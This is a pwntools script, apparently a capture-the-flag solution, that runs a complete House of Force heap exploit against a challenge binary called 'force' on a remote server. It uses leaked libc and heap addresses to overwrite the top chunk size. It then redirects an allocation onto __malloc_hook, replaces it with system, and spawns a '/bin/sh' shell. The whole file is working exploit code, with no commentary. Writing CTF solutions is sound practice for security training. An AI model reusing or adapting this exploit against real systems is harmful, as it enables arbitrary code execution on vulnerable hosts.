from pwn import *

local = 0
if local == 1:
	target = process('./force')

	pid = gdb.attach(target, "\nb *main+286\nb *main+249\n set disassembly-flavor intel\ncontinue")
else:
	target = remote('0.cloud.chals.io', 11996)

libc = ELF('.glibc/glibc_2.28_no-tcache/libc.so.6')

def malloc_chunk(size, content):
    print(target.recvuntil(b'(2) Surrender'))
    target.sendline(b'1')
    print(target.recvuntil(b'How many midi-chlorians?:'))
    target.sendline(str(size).encode('ascii'))
    print(target.recvuntil(b'What do you feel?:'))
    target.sendline(content)
    
print(target.recvuntil(b'You feel a system at'))
system_libc = int(target.recv(15), 16)
print(hex(system_libc))

print(target.recvuntil(b'You feel something else at'))
heap_base = int(target.recv(10), 16)
print(hex(heap_base))


malloc_chunk(0x88, b'a' * 0x88 + p64(0xffffffffffffffff))

libc_base = system_libc - libc.symbols['system']
malloc_hook = libc_base + libc.symbols['__malloc_hook']

distance = malloc_hook - (heap_base + 0x90 + 0x20)
print(hex(malloc_hook))

malloc_chunk(distance, b'/bin/sh\x00')
binsh = heap_base + 0x90 + 0x10

malloc_chunk(24, p64(system_libc))

malloc_chunk(binsh, b'')

target.interactive()
